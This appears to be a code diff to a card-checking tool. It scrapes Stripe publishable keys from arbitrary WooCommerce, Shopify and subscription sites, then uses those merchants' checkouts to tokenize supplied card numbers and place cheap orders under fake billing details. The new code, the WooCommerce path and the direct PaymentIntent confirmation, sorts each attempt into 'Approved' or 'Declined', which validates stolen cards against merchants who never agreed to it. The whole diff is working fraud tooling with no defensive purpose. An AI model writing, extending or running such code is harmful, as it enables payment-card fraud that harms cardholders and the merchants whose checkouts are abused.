@@ -162,6 +162,11 @@ def _make_session() -> requests.Session:
 
 
 def _extract_stripe_pk(html_text: str) -> str | None:
+    """
+    Extract Stripe publishable key from HTML/JS source.
+    Covers all common embedding patterns.
+    """
+    # Direct pk_live_* / pk_test_* string anywhere in page/bundle
     for pat in _PK_PATTERNS:
         m = re.search(pat, html_text)
         if m:
@@ -169,26 +174,235 @@ def _extract_stripe_pk(html_text: str) -> str | None:
     return None
 
 
+def _extract_stripe_pk_extended(html_text: str) -> str | None:
+    """
+    Deeper extraction: checks data-attributes, window config objects, JSON-LD,
+    __NEXT_DATA__, and meta tags that may obfuscate or split the key.
+    """
+    # 1. Standard scan first
+    pk = _extract_stripe_pk(html_text)
+    if pk:
+        return pk
+
+    # 2. data-key / data-stripe / data-publishable-key attributes
+    for m in re.finditer(
+        r'data-(?:key|stripe(?:-key)?|publishable-key|pk)[=\s:]["\']?(pk_(?:live|test)_[A-Za-z0-9]{20,})',
+        html_text, re.IGNORECASE,
+    ):
+        return m.group(1)
+
+    # 3. window.* / var / const assignment  (e.g. window.stripeKey = "pk_live_...")
+    for m in re.finditer(
+        r'(?:window\.[a-zA-Z_$][a-zA-Z0-9_$]*|var\s+\w+|const\s+\w+|let\s+\w+)'
+        r'\s*=\s*["\`\'](pk_(?:live|test)_[A-Za-z0-9]{20,})["\`\']',
+        html_text, re.IGNORECASE,
+    ):
+        return m.group(1)
+
+    # 4. JSON properties in __NEXT_DATA__, Alpine data, or inline JSON blobs
+    for m in re.finditer(
+        r'"[a-zA-Z_]*(?:[Ss]tripe|[Pp]ublishable|[Pp][Kk])[a-zA-Z_]*"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]{20,})"',
+        html_text,
+    ):
+        return m.group(1)
+
+    # 5. Meta tags  <meta name="stripe-key" content="pk_live_...">
+    for m in re.finditer(
+        r'<meta[^>]+content=["\']?(pk_(?:live|test)_[A-Za-z0-9]{20,})["\']?',
+        html_text, re.IGNORECASE,
+    ):
+        return m.group(1)
+
+    return None
+
+
 def _extract_stripe_pk_from_site(session: requests.Session, site_url: str) -> str | None:
-    """Fetch the site's HTML and extract a Stripe publishable key."""
+    """Fetch the site's HTML and extract a Stripe publishable key (all patterns)."""
     try:
         r = session.get(site_url, timeout=12)
-        pk = _extract_stripe_pk(r.text)
+        pk = _extract_stripe_pk_extended(r.text)
         if pk:
             return pk
         # Also check JS bundles referenced from the page
-        for src in re.findall(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', r.text)[:5]:
+        for src in re.findall(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', r.text)[:6]:
             if not src.startswith("http"):
                 src = site_url.rstrip("/") + "/" + src.lstrip("/")
             try:
                 rjs = session.get(src, timeout=8)
-                pk = _extract_stripe_pk(rjs.text)
+                pk = _extract_stripe_pk_extended(rjs.text)
                 if pk:
                     return pk
             except Exception:
                 pass
     except Exception:
         pass
+    return None
+
+
+# ── PaymentIntent confirm (modern Stripe flow) ───────────────────────────────
+
+def _confirm_payment_intent(
+    stripe_pk: str,
+    payment_method_id: str,
+    client_secret: str,
+    site_url: str,
+) -> dict:
+    """
+    Confirm a Stripe PaymentIntent directly via the Stripe API.
+    Many modern sites POST to their backend to create a PI, then call
+    stripe.confirmPayment() in the browser. We replicate that here.
+
+    Returns {"status": "approved"|"declined"|"error", "message": "..."}.
+    """
+    pi_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else None
+    if not pi_id:
+        return {"status": "error", "message": "Could not parse PaymentIntent ID from client_secret"}
+
+    try:
+        r = requests.post(
+            f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
+            data={
+                "payment_method": payment_method_id,
+                "return_url": site_url + "/checkout/success",
+                "key": stripe_pk,
+            },
+            headers={
+                "authority": "api.stripe.com",
+                "accept": "application/json",
+                "content-type": "application/x-www-form-urlencoded",
+                "origin": "https://js.stripe.com",
+                "referer": "https://js.stripe.com/",
+                "user-agent": USER_AGENT,
+            },
+            timeout=20,
+        )
+        data = r.json()
+    except Exception as e:
+        return {"status": "error", "message": f"PI confirm request failed: {str(e)[:80]}"}
+
+    if "error" in data:
+        err = data["error"]
+        code = err.get("code", "")
+        msg  = err.get("message", "Card Declined")
+        _DECLINE_CODES = {
+            "card_declined", "insufficient_funds", "do_not_honor",
+            "generic_decline", "lost_card", "stolen_card",
+            "restricted_card", "blocked", "incorrect_cvc",
+            "expired_card", "invalid_expiry_year", "invalid_expiry_month",
+        }
+        if code in _DECLINE_CODES:
+            return {"status": "declined", "message": f"Declined - {msg}"}
+        if code in ("invalid_number", "incorrect_number"):
+            return {"status": "declined", "message": "Declined - Invalid Card Number"}
+        return {"status": "error", "message": f"Stripe error ({code}): {msg[:80]}"}
+
+    status = data.get("status", "")
+    if status == "succeeded":
+        return {"status": "approved", "message": "Approved ✅ Transaction Successful"}
+    if status == "requires_action":
+        return {"status": "approved", "message": "Approved ♻️ 3D Secure Required"}
+    if status in ("requires_payment_method", "canceled"):
+        return {"status": "declined", "message": f"Declined - {status}"}
+
+    return {"status": "error", "message": f"PaymentIntent status: {status or 'unknown'}"}
+
+
+def _extract_client_secret_from_page(html_text: str) -> str | None:
+    """Look for a PaymentIntent or SetupIntent client_secret embedded in the page."""
+    for m in re.finditer(
+        r'["\`\']?(pi_[A-Za-z0-9]{14,}_secret_[A-Za-z0-9]{24,})["\`\']?',
+        html_text,
+    ):
+        return m.group(1)
+    # Also check seti_ (SetupIntent secrets)
+    for m in re.finditer(
+        r'["\`\']?(seti_[A-Za-z0-9]{14,}_secret_[A-Za-z0-9]{24,})["\`\']?',
+        html_text,
+    ):
+        return m.group(1)
+    return None
+
+
+# ── WooCommerce helpers ───────────────────────────────────────────────────────
+
+def _find_woo_product(session: requests.Session, site_url: str) -> dict | None:
+    """
+    Detect WooCommerce (looks for wp-content in page source) and find the
+    cheapest in-stock product using the WooCommerce REST API or HTML scrape.
+    Returns a product dict with source="woocommerce", or None.
+    """
+    # Quick WooCommerce fingerprint
+    try:
+        r = session.get(site_url, timeout=12)
+        if not any(kw in r.text.lower() for kw in ("wp-content", "woocommerce", "wc-ajax")):
+            return None
+    except Exception:
+        return None
+
+    # Try WooCommerce REST API (available on all WC sites, no auth needed for public products)
+    for api_path in ["/wp-json/wc/v3/products", "/wp-json/wc/v2/products"]:
+        try:
+            rp = session.get(
+                site_url + api_path,
+                params={"per_page": 20, "orderby": "price", "order": "asc", "status": "publish"},
+                timeout=12,
+            )
+            if rp.status_code == 200:
+                products = rp.json()
+                if isinstance(products, list):
+                    for p in products:
+                        if p.get("purchasable") and p.get("price"):
+                            try:
+                                price = float(p["price"])
+                            except (TypeError, ValueError):
+                                continue
+                            if price <= 0:
+                                continue
+                            # Prefer a variation if available
+                            variant_id = None
+                            if p.get("type") == "variable" and p.get("variations"):
+                                variant_id = p["variations"][0]
+                            return {
+                                "title": p.get("name", "Product"),
+                                "price": price,
+                                "product_url": p.get("permalink", f"{site_url}/?p={p['id']}"),
+                                "product_id": p["id"],
+                                "variant_id": variant_id,
+                                "source": "woocommerce",
+                            }
+        except Exception:
+            pass
+
+    # Fallback: scrape /shop HTML for add-to-cart forms
+    for shop_path in ["/shop", "/store", "/products"]:
+        try:
+            rs = session.get(site_url + shop_path, timeout=12)
+            if rs.status_code != 200:
+                continue
+            # Look for add-to-cart button data-product_id
+            for m in re.finditer(
+                r'data-product[_-]id=["\'](\d+)["\'][^>]*data-price=["\']([0-9.]+)["\']'
+                r'|data-price=["\']([0-9.]+)["\'][^>]*data-product[_-]id=["\'](\d+)["\']',
+                rs.text, re.IGNORECASE,
+            ):
+                pid  = m.group(1) or m.group(4)
+                price_s = m.group(2) or m.group(3)
+                try:
+                    price = float(price_s)
+                except (TypeError, ValueError):
+                    continue
+                if pid and price > 0:
+                    return {
+                        "title": f"Product #{pid}",
+                        "price": price,
+                        "product_url": f"{site_url}/?p={pid}",
+                        "product_id": int(pid),
+                        "variant_id": None,
+                        "source": "woocommerce",
+                    }
+        except Exception:
+            continue
+
     return None
 
 
@@ -734,6 +948,11 @@ def find_cheapest_product(session: requests.Session, site_url: str) -> dict | No
     if skool_product is not None:
         return skool_product
 
+    # 0b. WooCommerce detection (before Shopify so we don't misdetect)
+    woo_product = _find_woo_product(session, site_url)
+    if woo_product is not None:
+        return woo_product
+
     # 1. Try Shopify /products.json endpoint first
     for path in ["/products.json", "/collections/all/products.json"]:
         try:
@@ -1037,6 +1256,205 @@ def checkout_and_charge(
             "stripe_pk": stripe_pk,
         }
 
+    # ── WooCommerce checkout path ──────────────────────────────────────────────
+    # Flow:  add to cart via ?wc-ajax=add_to_cart  →  extract Stripe PK from
+    #        /checkout page  →  create pm_/tok_  →  POST ?wc-ajax=checkout
+    if source == "woocommerce":
+        cc = card["cc"]; mm = card["mm"]; yy = card["yy"]; cvv = card["cvv"]
+        product_id = product_info.get("product_id")
+        variant_id = product_info.get("variant_id")
+
+        # Step 1: Add product to cart
+        _added = False
+        if product_id:
+            cart_data: dict = {"product_id": product_id, "quantity": 1}
+            if variant_id:
+                cart_data["variation_id"] = variant_id
+            for cart_url in [
+                f"{site_url}/?wc-ajax=add_to_cart",
+                f"{site_url}/wp-admin/admin-ajax.php",
+            ]:
+                try:
+                    rc = session.post(cart_url, data={**cart_data,
+                        "action": "woocommerce_add_to_cart"}, timeout=15)
+                    if rc.status_code == 200:
+                        _added = True
+                        break
+                except Exception:
+                    pass
+            # Also try simple URL-based add-to-cart
+            if not _added:
+                try:
+                    session.get(f"{site_url}/?add-to-cart={product_id}&quantity=1", timeout=12)
+                    _added = True
+                except Exception:
+                    pass
+
+        # Step 2: Load checkout page to grab Stripe PK + nonce
+        stripe_pk = None
+        page_html = ""
+        wc_nonce = ""
+        try:
+            rck = session.get(f"{site_url}/checkout", timeout=15, allow_redirects=True)
+            if rck.status_code == 200:
+                page_html = rck.text
+                stripe_pk = _extract_stripe_pk_extended(page_html)
+                # wc_stripe_params nonce
+                m_nonce = re.search(
+                    r'"createPaymentIntentNonce"\s*:\s*"([^"]+)"'
+                    r'|"wc_stripe_nonce"\s*:\s*"([^"]+)"'
+                    r'|name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']',
+                    page_html,
+                )
+                if m_nonce:
+                    wc_nonce = next(g for g in m_nonce.groups() if g) or ""
+        except Exception:
+            pass
+
+        # Step 3: Also scan JS files if PK not found yet
+        if not stripe_pk and page_html:
+            for js_src in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', page_html, re.IGNORECASE)[:6]:
+                if any(k in js_src.lower() for k in ("stripe", "checkout", "payment", "wc")):
+                    try:
+                        rj = session.get(urljoin(site_url, js_src), timeout=8)
+                        stripe_pk = _extract_stripe_pk_extended(rj.text)
+                        if stripe_pk:
+                            break
+                    except Exception:
+                        pass
+
+        if not stripe_pk:
+            # Last-ditch: try site root and any linked pages
+            stripe_pk = _extract_stripe_pk_from_site(session, site_url)
+        if not stripe_pk:
+            return {"status": "error", "message": "WooCommerce Stripe PK not found", "stripe_pk": None}
+
+        # Step 4: Check if checkout page embeds a client_secret (PI flow)
+        pi_secret = _extract_client_secret_from_page(page_html) if page_html else None
+
+        # Step 5: Create Stripe payment method
+        try:
+            pm_r = requests.post(
+                "https://api.stripe.com/v1/payment_methods",
+                data={"type": "card", "card[number]": cc, "card[cvc]": cvv,
+                      "card[exp_month]": mm, "card[exp_year]": yy, "key": stripe_pk},
+                headers={"authority": "api.stripe.com", "accept": "application/json",
+                         "content-type": "application/x-www-form-urlencoded",
+                         "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/",
+                         "user-agent": USER_AGENT},
+                timeout=20,
+            ).json()
+        except Exception as e:
+            return {"status": "error", "message": f"Stripe PM error: {e}", "stripe_pk": stripe_pk}
+
+        if "error" in pm_r:
+            err = pm_r["error"]
+            code = err.get("code", "")
+            msg  = err.get("message", "Declined")
+            _dm  = {"incorrect_number": "Incorrect Card Number",
+                    "invalid_number": "Invalid Card Number",
+                    "invalid_expiry_year": "Invalid Expiry Year",
+                    "invalid_expiry_month": "Invalid Expiry Month",
+                    "invalid_cvc": "Invalid CVC",
+                    "expired_card": "Expired Card",
+                    "card_declined": "Card Declined",
+                    "do_not_honor": "Do Not Honor"}
+            return {"status": "declined", "message": f"Declined - {_dm.get(code, msg)}",
+                    "stripe_pk": stripe_pk}
+
+        pm_id = pm_r.get("id")
+        if not pm_id:
+            return {"status": "error", "message": "No PM ID from Stripe", "stripe_pk": stripe_pk}
+
+        # Step 6a: If page has PI client_secret, confirm via PI confirm API
+        if pi_secret:
+            pi_result = _confirm_payment_intent(stripe_pk, pm_id, pi_secret, site_url)
+            pi_result["stripe_pk"] = stripe_pk
+            return pi_result
+
+        # Step 6b: Try WooCommerce create_payment_intent endpoint first (modern WC Stripe plugin)
+        if wc_nonce:
+            try:
+                r_pi = session.post(
+                    f"{site_url}/?wc-ajax=wc_stripe_create_payment_intent",
+                    data={"_wpnonce": wc_nonce, "payment_method": "stripe"},
+                    headers={"X-Requested-With": "XMLHttpRequest",
+                             "Referer": f"{site_url}/checkout"},
+                    timeout=20,
+                )
+                if r_pi.status_code == 200:
+                    pi_data = r_pi.json()
+                    cs = (pi_data.get("data", {}).get("client_secret")
+                          or pi_data.get("client_secret"))
+                    if cs:
+                        pi_result = _confirm_payment_intent(stripe_pk, pm_id, cs, site_url)
+                        pi_result["stripe_pk"] = stripe_pk
+                        return pi_result
+            except Exception:
+                pass
+
+        # Step 6c: Classic WooCommerce checkout form POST
+        hidden_fields = _extract_form_fields(page_html) if page_html else {}
+        woo_payload = {
+            **hidden_fields,
+            "billing_first_name":  "John",
+            "billing_last_name":   "Smith",
+            "billing_email":       card.get("email", "test@example.com"),
+            "billing_phone":       "5551234567",
+            "billing_address_1":   "123 Main St",
+            "billing_city":        "New York",
+            "billing_state":       "NY",
+            "billing_postcode":    "10001",
+            "billing_country":     "US",
+            "payment_method":      "stripe",
+            "payment_method_id":   pm_id,
+            "wc-stripe-payment-method": pm_id,
+            "ship_to_different_address": "0",
+            "terms":               "1",
+            "_wpnonce":            wc_nonce,
+        }
+        try:
+            r_co = session.post(
+                f"{site_url}/?wc-ajax=checkout",
+                data=woo_payload, timeout=25, allow_redirects=True,
+                headers={"X-Requested-With": "XMLHttpRequest",
+                         "Referer": f"{site_url}/checkout"},
+            )
+            if r_co.status_code == 200:
+                try:
+                    co_json = r_co.json()
+                    result_field = co_json.get("result", "")
+                    messages = co_json.get("messages", "")
+                    # New WC Stripe: check for redirect to Stripe confirm
+                    redirect = co_json.get("redirect", "")
+                    if "checkout.stripe.com" in redirect or "payment_intent" in redirect:
+                        # PI may be embedded in redirect URL
+                        pi_m = re.search(r'pi_[A-Za-z0-9]+_secret_[A-Za-z0-9]+', redirect)
+                        if pi_m:
+                            pi_result = _confirm_payment_intent(stripe_pk, pm_id, pi_m.group(0), site_url)
+                            pi_result["stripe_pk"] = stripe_pk
+                            return pi_result
+                        return {"status": "approved",
+                                "message": "Approved ♻️ 3D Secure Required",
+                                "stripe_pk": stripe_pk}
+                    if result_field == "success" or "order-received" in redirect:
+                        return {"status": "approved",
+                                "message": "Approved ✅ WooCommerce Order Placed",
+                                "stripe_pk": stripe_pk}
+                    if result_field == "fail" or "declined" in messages.lower() or "card" in messages.lower():
+                        return {"status": "declined",
+                                "message": f"Declined - {messages[:100] if messages else 'Card Declined'}",
+                                "stripe_pk": stripe_pk}
+                except (ValueError, AttributeError):
+                    if "order-received" in r_co.url or "order-received" in r_co.text:
+                        return {"status": "approved",
+                                "message": "Approved ✅ WooCommerce Order Placed",
+                                "stripe_pk": stripe_pk}
+        except Exception:
+            pass
+
+        return {"status": "error", "message": "WooCommerce checkout did not return a clear result", "stripe_pk": stripe_pk}
+
     # ── Subscription / Membership path ────────────────────────────────────────
     # For subscription sites we skip the Shopify cart entirely and instead:
     #   1. Pull the pricing / plan page to get the Stripe PK
@@ -1066,7 +1484,7 @@ def checkout_and_charge(
                 if _detect_captcha(rp.text):
                     return {"status": "error", "message": "Site requires CAPTCHA at subscription page — cannot auto-hit", "stripe_pk": None}
                 if rp.status_code == 200:
-                    pk = _extract_stripe_pk(rp.text)
+                    pk = _extract_stripe_pk_extended(rp.text)
                     if pk:
                         stripe_pk = pk
                         page_html  = rp.text
@@ -1083,7 +1501,7 @@ def checkout_and_charge(
                 if any(k in js_url.lower() for k in ("stripe", "checkout", "payment", "billing")):
                     try:
                         rj = session.get(urljoin(site_url, js_url), timeout=10)
-                        stripe_pk = _extract_stripe_pk(rj.text)
+                        stripe_pk = _extract_stripe_pk_extended(rj.text)
                         if stripe_pk:
                             break
                     except Exception:
@@ -1095,6 +1513,10 @@ def checkout_and_charge(
                 "message": "Stripe PK not found on subscription/pricing pages",
                 "stripe_pk": None,
             }
+
+        # If the page already embeds a PaymentIntent client_secret, confirm it directly
+        # (many modern SaaS checkout pages pre-create a PI and embed it in JS)
+        pi_secret_sub = _extract_client_secret_from_page(page_html) if page_html else None
 
         # Tokenize card
         cc = card["cc"]; mm = card["mm"]; yy = card["yy"]; cvv = card["cvv"]
@@ -1141,6 +1563,12 @@ def checkout_and_charge(
         payment_id = sub_stripe_resp.get("id")
         if not payment_id:
             return {"status": "error", "message": "No payment method ID from Stripe", "stripe_pk": stripe_pk}
+
+        # Shortcut: if the page pre-embedded a PI client_secret, confirm it directly
+        if pi_secret_sub:
+            pi_result = _confirm_payment_intent(stripe_pk, payment_id, pi_secret_sub, site_url)
+            pi_result["stripe_pk"] = stripe_pk
+            return pi_result
 
         # ── Gather all HTML + linked JS text for endpoint extraction ────────────
         hidden = _extract_form_fields(page_html)
@@ -1465,7 +1893,7 @@ def checkout_and_charge(
 
             if r_co.status_code == 200:
                 checkout_html = r_co.text
-                stripe_pk = _extract_stripe_pk(checkout_html)
+                stripe_pk = _extract_stripe_pk_extended(checkout_html)
                 if stripe_pk:
                     break
         except Exception:
@@ -1478,7 +1906,7 @@ def checkout_and_charge(
                 try:
                     full_js = urljoin(site_url, js_url)
                     rj = session.get(full_js, timeout=10)
-                    stripe_pk = _extract_stripe_pk(rj.text)
+                    stripe_pk = _extract_stripe_pk_extended(rj.text)
                     if stripe_pk:
                         break
                 except Exception:
@@ -1562,6 +1990,13 @@ def checkout_and_charge(
     payment_id = stripe_resp.get("id")
     if not payment_id:
         return {"status": "error", "message": "No payment method ID from Stripe", "stripe_pk": stripe_pk}
+
+    # Shortcut: if checkout page pre-embeds a PI client_secret, confirm directly
+    pi_secret_generic = _extract_client_secret_from_page(checkout_html) if checkout_html else None
+    if pi_secret_generic:
+        pi_result = _confirm_payment_intent(stripe_pk, payment_id, pi_secret_generic, site_url)
+        pi_result["stripe_pk"] = stripe_pk
+        return pi_result
 
     # ── Step 4: Submit payment to merchant ───────────────────────────────────
     hidden = _extract_form_fields(checkout_html)
